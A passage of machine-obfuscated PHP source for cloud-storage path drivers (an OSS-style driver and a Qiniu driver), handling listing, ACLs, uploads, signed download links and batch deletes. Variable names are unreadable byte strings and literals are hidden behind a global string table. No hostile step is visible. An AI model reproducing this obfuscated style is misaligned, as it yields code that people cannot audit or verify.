count($ÏíğĞ®ç[$´¨¢Éò”[82]]); $ôĞó±üì[$´¨¢Éò”[77]] += count($ÏíğĞ®ç[$´¨¢Éò”[83]]); foreach ($ÏíğĞ®ç[$´¨¢Éò”[83]] as $â–²×Ó±) { if (!$â–²×Ó± || !$â–²×Ó±[$´¨¢Éò”[76]]) { continue; } $ôĞó±üì[$´¨¢Éò”[76]] += $â–²×Ó±[$´¨¢Éò”[76]]; } } public function has($šÍı¬İÇ, $»áœáëİ = false, $®ÒæÈõº = true) { $¿€Å¢£Î =& $_SERVER[óó‹¸‚å]; $šÍı¬İÇ = trim($šÍı¬İÇ, $¿€Å¢£Î[8]); $å——³²µ = empty($šÍı¬İÇ) && $šÍı¬İÇ !== $¿€Å¢£Î[197] ? $¿€Å¢£Î[12] : $šÍı¬İÇ . $¿€Å¢£Î[8]; $ıÉˆÖêæ = $¿€Å¢£Î[12]; $Ô—¿§Á² = 500; $ÒóãÈÜ = $“¡èâ¾Œ = 0; while (!0) { check_abort(); $­•Êê»¦ = array($¿€Å¢£Î[1411] => $¿€Å¢£Î[8], $¿€Å¢£Î[1412] => $å——³²µ, $¿€Å¢£Î[1413] => $Ô—¿§Á², $¿€Å¢£Î[1414] => $ıÉˆÖêæ); try { $¯¹ÉÌÉ¯ = $this->client->listObjects($this->bucket, $­•Êê»¦); } catch (OSS\Core\OssException $œ‡­Ÿ«·) { break; } $ıÉˆÖêæ = $¯¹ÉÌÉ¯->getNextMarker(); $‡–—Í¢ = $¯¹ÉÌÉ¯->getObjectList(); $ÛÛßÅº¯ = $¯¹ÉÌÉ¯->getPrefixList(); if ($»áœáëİ) { if (count($‡–—Í¢) > 1 || count($‡–—Í¢) == 1 && $‡–—Í¢[0]->getKey() != $å——³²µ) { $ÒóãÈÜ += count($‡–—Í¢) - 1; } if (!empty($ÛÛßÅº¯)) { $“¡èâ¾Œ += count($ÛÛßÅº¯); } if ($ıÉˆÖêæ === $¿€Å¢£Î[12]) { break; } continue; } if ($®ÒæÈõº) { if (!empty($‡–—Í¢)) { if (count($‡–—Í¢) > 1 || $‡–—Í¢[0]->getKey() != $å——³²µ) { return !0; } } } else { if (!empty($ÛÛßÅº¯)) { return !0; } } if ($ıÉˆÖêæ === $¿€Å¢£Î[12]) { break; } } if ($»áœáëİ) { return array($¿€Å¢£Î[207] => $ÒóãÈÜ, $¿€Å¢£Î[208] => $“¡èâ¾Œ); } return !1; } public function listAll($¶ÃÓà™Ä) { $ùŸ¬ËñÙ =& $_SERVER[óó‹¸‚å]; $£ó¡Á°É = $this->fileList($¶ÃÓà™Ä, $ùŸ¬ËñÙ[12], !0); $úÆÛò› = array(); foreach ($£ó¡Á°É[$ùŸ¬ËñÙ[83]] as $åµ‘ÄÚè) { $úÆÛò›[$åµ‘ÄÚè[$ùŸ¬ËñÙ[32]]] = $åµ‘ÄÚè[$ùŸ¬ËñÙ[76]]; } foreach ($£ó¡Á°É[$ùŸ¬ËñÙ[82]] as $åµ‘ÄÚè) { if (is_string($åµ‘ÄÚè)) { $úÆÛò›[$åµ‘ÄÚè] = 0; } } return $this->listAllFiles($¶ÃÓà™Ä, array_keys($úÆÛò›), $úÆÛò›); } public function canRead($ãÏ€”î¤) { $µëˆ“ËÖ =& $_SERVER[óó‹¸‚å]; $´´½…‘ƒ = $this->pathAcl($ãÏ€”î¤); return $´´½…‘ƒ == $µëˆ“ËÖ[1424] || $´´½…‘ƒ == $µëˆ“ËÖ[556] ? !0 : !1; } public function canWrite($Íä–˜¤¸) { $Á‹÷·’Ë = $this->pathAcl($Íä–˜¤¸); return $Á‹÷·’Ë == $_SERVER[óó‹¸‚å][556] ? !0 : !1; } public function pathAcl($ï’òãüÀ) { $Ûéöì¼ =& $_SERVER[óó‹¸‚å]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $øö¡éë¥ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ï’òãüÀ)); } catch (OSS\Core\OssException $Â®·Â÷¿) { return !1; } $²ÓÏù… = $øö¡éë¥ == $Ûéöì¼[37] ? $this->bucketAcl : $øö¡éë¥; if ($²ÓÏù… == $Ûéöì¼[1425]) { return $Ûéöì¼[1424]; } if ($²ÓÏù… == $Ûéöì¼[1426]) { return $Ûéöì¼[556]; } return $²ÓÏù…; } private function chmodPath($€æòÑª, $øÀ³¸×§ = '') { $¤ëë”Çñ =& $_SERVER[óó‹¸‚å]; $¬ø•ŞÖ = empty($øÀ³¸×§) ? $¤ëë”Çñ[1426] : $øÀ³¸×§; $—íœñÅ = array($¤ëë”Çñ[37], $¤ëë”Çñ[198], $¤ëë”Çñ[1425], $¤ëë”Çñ[1426]); if (!in_array($¬ø•ŞÖ, $—íœñÅ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($€æòÑª), $¬ø•ŞÖ); } catch (OSS\Core\OssException $±ğÉ·Å) { return !1; } return !0; } public function getContent($ÁĞÅ³ÅÊ) { return $this->fileSubstr($ÁĞÅ³ÅÊ, -1); } public function setContent($åÓÁ‹•, $µ¿Èöº = '') { $£µõ­ğÙ =& $_SERVER[óó‹¸‚å]; try { $“Èƒ²ëï = $this->trafficLimit($£µõ­ğÙ[1427]); $Ç´Ôˆò‹ = $this->client->putObject($this->bucket, $this->pathEncode($åÓÁ‹•), $µ¿Èöº, $“Èƒ²ëï); } catch (OSS\Core\OssException $ïõ‹ßç) { return !1; } $ï‘‰ŒÔİ = array($£µõ­ğÙ[1417] => trim($Ç´Ôˆò‹[$£µõ­ğÙ[1428]], $£µõ­ğÙ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($åÓÁ‹•))); $this->updateObjMeta($åÓÁ‹•, $ï‘‰ŒÔİ); return isset($Ç´Ôˆò‹[$£µõ­ğÙ[1429]][$£µõ­ğÙ[1374]]) ? !0 : !1; } private function updateObjMeta($ÃƒËÄğ, $Â´ïÙ¾Ä) { $ÃƒËÄğ = $this->pathEncode($ÃƒËÄğ); try { $„œ¸ÍÅ = array(OSS\OssClient::OSS_HEADERS => $Â´ïÙ¾Ä); $this->client->copyObject($this->bucket, $ÃƒËÄğ, $this->bucket, $ÃƒËÄğ, $„œ¸ÍÅ); } catch (OSS\Core\OssException $ ÛâŒÎ) { return !1; } return !0; } public function upload($•éÄ½ªÊ, $…„Ã¥…Á, $¢ì¾é«¦ = false, $Ú·—Şßı = REPEAT_REPLACE) { $õëşöÌú =& $_SERVER[óó‹¸‚å]; $¨‚‘Ù‘Ê = trim($•éÄ½ªÊ, $õëşöÌú[8]); $Î¹èëéĞ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($õëşöÌú[1417] => @md5_file($…„Ã¥…Á)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($•éÄ½ªÊ))); $Î¹èëéĞ = $this->trafficLimit($õëşöÌú[1427], $Î¹èëéĞ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¨‚‘Ù‘Ê), $…„Ã¥…Á, $Î¹èëéĞ); } catch (OSS\Core\OssException $‡ÁŞä›Ö) { return !1; } return $this->getPathOuter($•éÄ½ªÊ); } public function getHost() { $±ÍıœÜŸ =& $_SERVER[óó‹¸‚å]; $÷©«¦¼® = explode($±ÍıœÜŸ[183], parent::getHost()); return $÷©«¦¼®[0] . $±ÍıœÜŸ[183] . $this->bucket . $±ÍıœÜŸ[10] . $÷©«¦¼®[1]; } public function uploadFormData($ÀãÜ¨Ğ, $¾Ì—Ê¨Ö = 3600) { $¸İö×¾Ã =& $_SERVER[óó‹¸‚å]; if (!($ë±şßºŒ = $this->getHost())) { return !1; } $ÂğÖ® ² = $¾Ì—Ê¨Ö; $ÂÓ¹¿“± = date($¸İö×¾Ã[1430], time() + $ÂğÖ® ²); $ÑüŸí ½ = new DateTime($ÂÓ¹¿“±); $¼ôÖÏ™” = $ÑüŸí ½->format(DateTime::ISO8601); $¸­®Şõ = strpos($¼ôÖÏ™”, $¸İö×¾Ã[296]); $¼ôÖÏ™” = substr($¼ôÖÏ™”, 0, $¸­®Şõ) . $¸İö×¾Ã[1431]; $‚˜«äÖ = 1048576000 * 5; $€’Ÿí = $this->pathFather($ÀãÜ¨Ğ); $˜®´İı¹ = array($¸İö×¾Ã[1328] => $¼ôÖÏ™”, $¸İö×¾Ã[1329] => array(array($¸İö×¾Ã[1432], 0, $‚˜«äÖ), array($¸İö×¾Ã[1332], $¸İö×¾Ã[1333], $€’Ÿí))); $Úœ¾Šª = base64_encode(json_encode($˜®´İı¹)); $ª‹ğóÅ = base64_encode(hash_hmac($¸İö×¾Ã[232], $Úœ¾Šª, $this->secret, !0)); $·ÚÔ§ = array($¸İö×¾Ã[1338] => $Úœ¾Šª, $¸İö×¾Ã[1433] => $this->accessKey, $¸İö×¾Ã[1334] => $¸İö×¾Ã[1326], $¸İö×¾Ã[1434] => $ª‹ğóÅ, $¸İö×¾Ã[181] => $ë±şßºŒ); $·ÚÔ§ = $this->trafficLimit($¸İö×¾Ã[1427], $·ÚÔ§); return $·ÚÔ§; } public function multiUploadFormData($Í¢±€ö, $ÕòˆŠúğ = 3600) { $Šß°ñÓ =& $_SERVER[óó‹¸‚å]; if (!($ÛÍ•í  = $this->getHost())) { return !1; } $°¨ú§÷· = $this->trafficLimit($Šß°ñÓ[1427]); $ü·ÁÇÁ† = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Í¢±€ö), $°¨ú§÷·); return array($Šß°ñÓ[223] => $ü·ÁÇÁ†, $Šß°ñÓ[181] => $ÛÍ•í  . $Šß°ñÓ[8] . $this->pathEncode($Í¢±€ö), $Šß°ñÓ[224] => gmdate($Šß°ñÓ[1435]), $Šß°ñÓ[94] => $Í¢±€ö); } public function multiUploadAuthData($’à‹†ø½, $ëù¼®ùâ = array()) { $Óâ¦‘ç£ =& $_SERVER[óó‹¸‚å]; $òƒ“¿¸ = isset($ëù¼®ùâ[$Óâ¦‘ç£[224]]) ? $ëù¼®ùâ[$Óâ¦‘ç£[224]] : gmdate($Óâ¦‘ç£[1435]); $‚®öÙá“ = isset($ëù¼®ùâ[$Óâ¦‘ç£[174]]) ? $ëù¼®ùâ[$Óâ¦‘ç£[174]] : $Óâ¦‘ç£[12]; $ÜÒ­Ãœü = $’à‹†ø½; if (isset($ëù¼®ùâ[$Óâ¦‘ç£[94]])) { $ÜÒ­Ãœü = $ëù¼®ùâ[$Óâ¦‘ç£[94]]; unset($ëù¼®ùâ[$Óâ¦‘ç£[94]]); } if (isset($ëù¼®ùâ[$Óâ¦‘ç£[225]])) { $ëù¼®ùâ[$Óâ¦‘ç£[224]] = $òƒ“¿¸; return $this->listUploadParts($ÜÒ­Ãœü, $ëù¼®ùâ); } $Ì³¿Æ²ô = array($Óâ¦‘ç£[226], $Óâ¦‘ç£[12], $Óâ¦‘ç£[120], $òƒ“¿¸, "\x78\55\157\163\x73\55\144\x61\x74\145\72{$òƒ“¿¸}", $Óâ¦‘ç£[8] . $this->bucket . $Óâ¦‘ç£[8] . $ÜÒ­Ãœü . $‚®öÙá“); if (strpos($‚®öÙá“, $Óâ¦‘ç£[227]) === 0) { $Ì³¿Æ²ô[0] = $Óâ¦‘ç£[228]; if ($ûòÃáéÍ = $this->trafficLimit($Óâ¦‘ç£[1427])) { $ÜÒ­Ãœü = $Óâ¦‘ç£[1436]; array_splice($Ì³¿Æ²ô, 5, 0, $ÜÒ­Ãœü . $Óâ¦‘ç£[4] . $ûòÃáéÍ[$ÜÒ­Ãœü]); } } if (isset($ëù¼®ùâ[$Óâ¦‘ç£[229]]) && $ëù¼®ùâ[$Óâ¦‘ç£[229]] == $Óâ¦‘ç£[230]) { $Ì³¿Æ²ô[0] = $Óâ¦‘ç£[230]; } if (!empty($ëù¼®ùâ[$Óâ¦‘ç£[1437]])) { $ÂÛÓ©¾ê = array_merge(array($Ì³¿Æ²ô[4]), $ëù¼®ùâ[$Óâ¦‘ç£[1437]]); sort($ÂÛÓ©¾ê); $Ì³¿Æ²ô[4] = implode($Óâ¦‘ç£[231], $ÂÛÓ©¾ê); } $«ÂÊÍÍŞ = implode($Óâ¦‘ç£[231], $Ì³¿Æ²ô); $¥ãıØç = base64_encode(hash_hmac($Óâ¦‘ç£[232], $«ÂÊÍÍŞ, $this->secret, !0)); $ÅĞÃ¥«ø = $Óâ¦‘ç£[1401] . $this->accessKey . $Óâ¦‘ç£[4] . $¥ãıØç; if (strpos($‚®öÙá“, $Óâ¦‘ç£[227]) === 0) { $ÅĞÃ¥«ø = array($Óâ¦‘ç£[234] => $ÅĞÃ¥«ø, $Óâ¦‘ç£[224] => $òƒ“¿¸); if ($ûòÃáéÍ) { $ÅĞÃ¥«ø = array_merge($ÅĞÃ¥«ø, $ûòÃáéÍ); } } return $ÅĞÃ¥«ø; } public function listUploadParts($òÙÚœ¾Ì, $ª›æä½) { $„İÈ»§Ë =& $_SERVER[óó‹¸‚å]; $Æ›Œ€¢Œ = parse_url_query($ª›æä½[$„İÈ»§Ë[174]]); $íö©çñ© = $this->client->listParts($this->bucket, $this->pathEncode($òÙÚœ¾Ì), $Æ›Œ€¢Œ[$„İÈ»§Ë[223]]); $Ø¸½üÃ° = $íö©çñ©->getListPart(); $“©ÏŞıõ = array(); foreach ($Ø¸½üÃ° as $ßôˆµŠ‚) { $“©ÏŞıõ[] = array($„İÈ»§Ë[1421] => $ßôˆµŠ‚->getPartNumber(), $„İÈ»§Ë[1422] => trim($ßôˆµŠ‚->getETag(), $„İÈ»§Ë[118])); } unset($ª›æä½[$„İÈ»§Ë[225]], $ª›æä½[$„İÈ»§Ë[229]]); $²•¼€üğ = $this->multiUploadAuthData($òÙÚœ¾Ì, $ª›æä½); if (empty($²•¼€üğ)) { return !1; } return array($„İÈ»§Ë[234] => $²•¼€üğ, $„İÈ»§Ë[224] => $ª›æä½[$„İÈ»§Ë[224]], $„İÈ»§Ë[236] => $“©ÏŞıõ); } public function download($Ğ„À¦š½, $À‚„Ùéµ) { if ($this->isFolder($Ğ„À¦š½)) { return !1; } try { $ÌŞñ„ƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $À‚„Ùéµ); $ÌŞñ„ƒ = $this->trafficLimit($_SERVER[óó‹¸‚å][109], $ÌŞñ„ƒ); $this->client->getObject($this->bucket, $this->pathEncode($Ğ„À¦š½), $ÌŞñ„ƒ); } catch (OSS\Core\OssException $©ÓÓÑ) { return !1; } return $À‚„Ùéµ; } public function fileSubstr($ÉÖ¹Şìâ, $İÜÃ³›’ = 0, $†Šˆ»È = false) { if ($İÜÃ³›’ === -1) { $±½õ¯®š = array(); } else { if ($†Šˆ»È === !1) { $íåÕ®¾û = $this->size($ÉÖ¹Şìâ); } else { $íåÕ®¾û = $İÜÃ³›’ + $†Šˆ»È - 1; } $±½õ¯®š = array(OSS\OssClient::OSS_RANGE => "{$İÜÃ³›’}\x2d{$íåÕ®¾û}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÉÖ¹Şìâ), $±½õ¯®š); } catch (OSS\Core\OssException $ÏĞëÊ»¨) { think_exception($ÏĞëÊ»¨->getMessage()); return !1; } } private function trafficLimit($º‰æÑÎ¦, $ÎŠ”ôğ = array()) { $ª„ö¢íÔ =& $_SERVER[óó‹¸‚å]; if ($º‰æÑÎ¦ == $ª„ö¢íÔ[1427] && $this->isUploadServer() || $º‰æÑÎ¦ == $ª„ö¢íÔ[109] && $this->isFileOutServer()) { return $ÎŠ”ôğ; } $Ğà¯™Û© = floatval($GLOBALS[$ª„ö¢íÔ[6]][$ª„ö¢íÔ[89]][$ª„ö¢íÔ[107]][$º‰æÑÎ¦]) * 1024 * 1024 * 8; if (!$Ğà¯™Û©) { return $ÎŠ”ôğ; } $Ğà¯™Û© = $Ğà¯™Û© < 819200 ? 819200 : ($Ğà¯™Û© > 838860800 ? 838860800 : $Ğà¯™Û©); $ÎŠ”ôğ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ğà¯™Û©); return $ÎŠ”ôğ; } public function link($¬áÏÁİ, $ë’Şäáş = array()) { $É‘»ôÄ¿ =& $_SERVER[óó‹¸‚å]; if (!$this->exist($¬áÏÁİ) || $this->isFolder($¬áÏÁİ)) { return !1; } try { $ë’Şäáş = $this->trafficLimit($É‘»ôÄ¿[109], $ë’Şäáş); $ŠĞ¥÷ëÜ = $this->client->signUrl($this->bucket, $this->pathEncode($¬áÏÁİ), 3600 * 12, $É‘»ôÄ¿[230], $ë’Şäáş); return $this->getCdnLink($ŠĞ¥÷ëÜ); } catch (OSS\Core\OssException $ø¹ÚŠ•’) { return !1; } } public function fileOut($ù•´¼•Â, $¼ø¶Á¾İ = false, $éÕ£Ï€² = false, $³õÓğ’ = '') { $èˆÔù‘ =& $_SERVER[óó‹¸‚å]; if ($this->isFileOutServer()) { return $this->fileOutServer($ù•´¼•Â, $¼ø¶Á¾İ, $éÕ£Ï€², $³õÓğ’); } if (!$éÕ£Ï€²) { $éÕ£Ï€² = $this->pathThis($ù•´¼•Â); } $éÕ£Ï€² = rawurlencode($éÕ£Ï€²); $ÆÏÕğ†¶ = get_file_mime(get_path_ext($éÕ£Ï€²)); if ($ÆÏÕğ†¶ == $èˆÔù‘[217]) { return parent::fileOut($ù•´¼•Â, $¼ø¶Á¾İ, $éÕ£Ï€², $³õÓğ’); } $¼ø¶Á¾İ = $¼ø¶Á¾İ ? $èˆÔù‘[1438] : $èˆÔù‘[1439]; $îã¦ Ò = array(OSS\OssClient::OSS_SUB_RESOURCE => $èˆÔù‘[1440] . rawurlencode("{$¼ø¶Á¾İ}\73\146\151\154\x65\156\141\x6d\145\75{$éÕ£Ï€²}")); $îã¦ Ò[OSS\OssClient::OSS_SUB_RESOURCE] .= $èˆÔù‘[1441] . rawurlencode($ÆÏÕğ†¶); $Ë¾–ÕÉí = $this->link($ù•´¼•Â, $îã¦ Ò); $this->fileOutLink($Ë¾–ÕÉí); } public function fileOutServer($¬˜Ìã“š, $ÚÛ«¬­ğ = false, $©ËæêÀ = false, $¼÷Ä®Œ– = '') { parent::fileOut($¬˜Ìã“š, $ÚÛ«¬­ğ, $©ËæêÀ, $¼÷Ä®Œ–); } public function fileOutImage($·ì§óóª, $ÉäˆŸÒ = 250) { $õõ­¨è = array(OSS\OssClient::OSS_PROCESS => $_SERVER[óó‹¸‚å][1442] . $ÉäˆŸÒ); $¸çØ•»ª = $this->link($·ì§óóª, $õõ­¨è); $this->fileOutLink($¸çØ•»ª); } public function fileOutImageServer($¼ñµøÎ, $ßƒÛ¨½µ = 250) { parent::fileOutImage($¼ñµøÎ, $ßƒÛ¨½µ); } public function fileOutLink($³îáÆ›) { $áˆíÎÉ =& $_SERVER[óó‹¸‚å]; if (!$this->isCdnHost() && substr($³îáÆ›, 0, 7) == $áˆíÎÉ[1341]) { $³îáÆ› = $áˆíÎÉ[1342] . substr($³îáÆ›, 7); } header($áˆíÎÉ[161] . $³îáÆ›); die; } public function hashMd5($ºìÓŞÇ, $Û­´ÓÏÉ = '') { $Ö¨¨ÖÌ =& $_SERVER[óó‹¸‚å]; $‘©Òôçñ = $this->_objectMeta($ºìÓŞÇ); if (!$‘©Òôçñ) { return $Ö¨¨ÖÌ[12]; } if (!isset($‘©Òôçñ[$Ö¨¨ÖÌ[1417]]) && !empty($Û­´ÓÏÉ)) { $ÜÏ»îÉª = $this->updateObjMeta($ºìÓŞÇ, array($Ö¨¨ÖÌ[1417] => $Û­´ÓÏÉ)); $‘©Òôçñ[$Ö¨¨ÖÌ[1417]] = $ÜÏ»îÉª ? $Û­´ÓÏÉ : $Ö¨¨ÖÌ[12]; } return isset($‘©Òôçñ[$Ö¨¨ÖÌ[1417]]) ? strtolower($‘©Òôçñ[$Ö¨¨ÖÌ[1417]]) : $Ö¨¨ÖÌ[12]; } public function size($ÜœĞ”È) { $¸äû–Â = $this->objectMeta($ÜœĞ”È); return $¸äû–Â ? $¸äû–Â[$_SERVER[óó‹¸‚å][76]] : 0; } public function info($‡ÄÈ±¶ª) { if ($this->isFolder($‡ÄÈ±¶ª)) { return $this->folderInfo($‡ÄÈ±¶ª); } else { if ($this->isFile($‡ÄÈ±¶ª)) { return $this->fileInfo($‡ÄÈ±¶ª); } } return !1; } public function exist($‹ûòÁ†ş) { return $this->isFile($‹ûòÁ†ş) || $this->isFolder($‹ûòÁ†ş); } public function isFile($ŞìÚÕÜ™) { return !$this->isFolder($ŞìÚÕÜ™) && $this->objectMeta($ŞìÚÕÜ™); } public function isFolder($ĞÓş¥Åê) { return $this->cacheMethod($_SERVER[óó‹¸‚å][165], $ĞÓş¥Åê); } protected function objectMeta($ÚÌ‹ã÷è) { return $this->cacheMethod($_SERVER[óó‹¸‚å][167], $ÚÌ‹ã÷è); } protected function _objectMeta($òúÉœµà) { $ÈÈÕÛÚ  =& $_SERVER[óó‹¸‚å]; try { $Ù¦ôãÂ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($òúÉœµà)); } catch (OSS\Core\OssException $œ—‹ÖÙ) { $Ù¦ôãÂ = !1; } if ($Ù¦ôãÂ) { $Ù¦ôãÂ[$ÈÈÕÛÚ [76]] = intval($Ù¦ôãÂ[$ÈÈÕÛÚ [1415]]); } return $Ù¦ôãÂ; } protected function _isFolder($Ïßğ¬§) { $ô»“ëÛ§ =& $_SERVER[óó‹¸‚å]; if ($Ïßğ¬§ == $ô»“ëÛ§[12] || $Ïßğ¬§ == $ô»“ëÛ§[8]) { return !0; } $êõ”ÔşÏ = array($ô»“ëÛ§[1411] => $ô»“ëÛ§[8], $ô»“ëÛ§[1412] => rtrim($Ïßğ¬§, $ô»“ëÛ§[8]) . $ô»“ëÛ§[8], $ô»“ëÛ§[1413] => 1, $ô»“ëÛ§[1414] => $ô»“ëÛ§[12]); $ÁµñßÚõ = $this->client->listObjects($this->bucket, $êõ”ÔşÏ); if ($ÁµñßÚõ->getObjectList() || $ÁµñßÚõ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($—ß¦˜Şü) { parent::__construct(); require_once SDK_DIR . $_SERVER[óó‹¸‚å][1443]; $this->_init($—ß¦˜Şü); } public function _init($—š®‰Ïë) { $ƒ¼–¸»é =& $_SERVER[óó‹¸‚å]; foreach ($—š®‰Ïë as $š™íÎÅ => $¶¤¤¹©Å) { if (isset($this->{$š™íÎÅ})) { $this->{$š™íÎÅ} = $¶¤¤¹©Å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ƒ¼–¸»é[1444] . LNG($ƒ¼–¸»é[1402])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($³è”˜ú, $¡Òöôôº = '', $õÉœ·¦ƒ = REPEAT_RENAME) { if ($this->setContent($³è”˜ú, $¡Òöôôº)) { return $this->getPathOuter($³è”˜ú); } return !1; } public function mkdir($ş£ÊÌ—, $ş…“å¹ = REPEAT_SKIP) { $‚µ›ãä =& $_SERVER[óó‹¸‚å]; $Ô„åòìë = trim($ş£ÊÌ—, $‚µ›ãä[8]); if ($this->_isFolder($Ô„åòìë)) { return $this->getPathOuter($Ô„åòìë); } $ş£ÊÌ— = $Ô„åòìë . $‚µ›ãä[8]; $•‹¤¿‹˜ = get_path_this($Ô„åòìë); $³²†è­ñ = $ş£ÊÌ— . $•‹¤¿‹˜; if (!$this->mkfile($³²†è­ñ)) { return !1; } if (!$this->moveFile($³²†è­ñ, $ş£ÊÌ—)) { $this->delFile($³²†è­ñ); return !1; } return $this->getPathOuter($Ô„åòìë); } public function copyFile($õËäØóò, $Ôãş­‘É) { $Ï€ç‚Î½ = $this->bucketManager->copy($this->bucket, $õËäØóò, $this->bucket, $Ôãş­‘É, !0); return $Ï€ç‚Î½ ? !1 : $this->getPathOuter($Ôãş­‘É); } public function moveFile($“Â¿é¬ã, $Š‘Ì‚Ÿ–) { $¶°ıš = $this->bucketManager->move($this->bucket, $“Â¿é¬ã, $this->bucket, $Š‘Ì‚Ÿ–, !0); return $¶°ıš ? !1 : $this->getPathOuter($Š‘Ì‚Ÿ–); } public function delFile($–Ã®Ö‰î) { if (!$this->exist($–Ã®Ö‰î)) { return !0; } $„áíÙ“½ = $this->bucketManager->delete($this->bucket, $–Ã®Ö‰î); return $„áíÙ“½ ? !1 : !0; } public function delFolder($šïµ±) { $¯£Ş€— =& $_SERVER[óó‹¸‚å]; if (!$this->exist($šïµ±)) { return !0; } $this->listItemCache = !1; $¬ï«Àª· = $this->fileList($šïµ±); $this->listItemCache = !0; $­çàÏõ“ = trim($šïµ±, $¯£Ş€—[8]) . $¯£Ş€—[8]; if (!empty($šïµ±) && $šïµ± !== $¯£Ş€—[197] && !in_array($­çàÏõ“, $¬ï«Àª·[$¯£Ş€—[82]])) { $¬ï«Àª·[$¯£Ş€—[82]][] = $­çàÏõ“; } $£²Î¥ Æ = $this->delByBatch($¬ï«Àª·[$¯£Ş€—[83]]); if (!$£²Î¥ Æ) { return !1; } $£²Î¥ Æ = $this->delByBatch($¬ï«Àª·[$¯£Ş€—[82]]); if (!$£²Î¥ Æ) { return !1; } return $this->delFile($­çàÏõ“); } private function delByBatch($›Î¤¿) { foreach (array_chunk($›Î¤¿, 1000) as $ê×ÕÕëú) { $»ËŠóò˜ = $this->bucketManager->buildBatchDelete($this->bucket, $ê×ÕÕëú); list($Å¹¯ËŞ×, $¥Á£·») = $this->bucketManager->batch($»ËŠóò˜); if ($¥Á£·») { return !1; } } return !0; } public function rename($úÙ’Æ™„, $ƒåÅ­ıŠ) { return $this->renameObject($úÙ’Æ™„, $ƒåÅ­ıŠ); } public function fileInfo($ÙåšÔ–‡, $ß¸ŸûÍ = false, $è¾ŠÓ•Á = array()) { $¿æ””• =& $_SERVER[óó‹¸‚å]; $©›Ã½ßê = array($¿æ””•[32] => $this->pathThis($ÙåšÔ–‡), $¿æ””•[84] => $this->getPathOuter($¿æ””•[8] . $ÙåšÔ–‡), $¿æ””•[33] => $¿æ””•[199], $¿æ””•[76] => isset($è¾ŠÓ•Á[$¿æ””•[1445]]) ? $è¾ŠÓ•Á[$¿æ””•[1445]] : 0, $¿æ””•[174] => $this->ext($ÙåšÔ–‡)); if ($ß¸ŸûÍ) { return $©›Ã½ßê; } $©›Ã½ßê[$¿æ””•[200]] = $©›Ã½ßê[$¿æ””•[85]] = 0; $©›Ã½ßê[$¿æ””•[201]] = $©›Ã½ßê[$¿æ””•[202]] = !0; if (empty($è¾ŠÓ•Á)) { $è¾ŠÓ•Á = $this->objectMeta($ÙåšÔ–‡); if (!$è¾ŠÓ•Á) { return $©›Ã½ßê; } } if (isset($è¾ŠÓ•Á[$¿æ””•[1446]])) { $©›Ã½ßê[$¿æ””•[85]] = substr($è¾ŠÓ•Á[$¿æ””•[1446]] . $¿æ””•[12], 0, 10); } if (isset($è¾ŠÓ•Á[$¿æ””•[1445]])) { $©›Ã½ßê[$¿æ””•[76]] = $è¾ŠÓ•Á[$¿æ””•[1445]]; } return $©›Ã½ßê; } public function folderInfo($Å‘È«¥ê, $˜†óë÷£ = false) { $ñâ¦ûæ =& $_SERVER[óó‹¸‚å]; $ƒ¿‡Çªî = array($ñâ¦ûæ[32] => $this->pathThis($Å‘È«¥ê), $ñâ¦ûæ[84] => $this->getPathOuter($ñâ¦ûæ[8] . $Å‘È«¥ê), $ñâ¦ûæ[33] => $ñâ¦ûæ[75]); if ($˜†óë÷£) { return $ƒ¿‡Çªî; } $ƒ¿‡Çªî[$ñâ¦ûæ[200]] = $ƒ¿‡Çªî[$ñâ¦ûæ[85]] = 0; $ƒ¿‡Çªî[$ñâ¦ûæ[201]] = $ƒ¿‡Çªî[$ñâ¦ûæ[202]] = !0; $Å‘È«¥ê = rtrim($Å‘È«¥ê, $ñâ¦ûæ[8]) . $ñâ¦ûæ[8]; $‚·—îÅ¹ = $this->objectMeta($Å‘È«¥ê); if (isset($‚·—îÅ¹[$ñâ¦ûæ[1446]])) { $ƒ¿‡Çªî[$ñâ¦ûæ[85]] = substr($‚·—îÅ¹[$ñâ¦ûæ[1446]] . $ñâ¦ûæ[12], 0, 10); } return $ƒ¿‡Çªî; } public function listPath($Ü§Á™ÉŒ, $ËÛÆ¬åê = false) { $­Ç¾«·Ş =& $_SERVER[óó‹¸‚å]; $­ô§ÎË» = $this->fileList($Ü§Á™ÉŒ, $­Ç¾«·Ş[8], !0); foreach ($­ô§ÎË»[$­Ç¾«·Ş[82]] as $Ê¥ç¦Ñ => $—Õ±’µ¼) { $­ô§ÎË»[$­Ç¾«·Ş[82]][$Ê¥ç¦Ñ] = $this->folderInfo($—Õ±’µ¼, $ËÛÆ¬åê); } foreach ($­ô§ÎË»[$­Ç¾«·Ş[83]] as $Ê¥ç¦Ñ => $—Õ±’µ¼) { $­ô§ÎË»[$­Ç¾«·Ş[83]][$Ê¥ç¦Ñ] = $this->fileInfo($—Õ±’µ¼[$­Ç¾«·Ş[94]], $ËÛÆ¬åê, $—Õ±’µ¼); } return $­ô§ÎË»; } public function has($¯¾ˆæîı, $•µ·ùÌ = false, $óë­Õãå = true) { $şçççıÚ =& $_SERVER[óó‹¸‚å]; $¯¾ˆæîı = 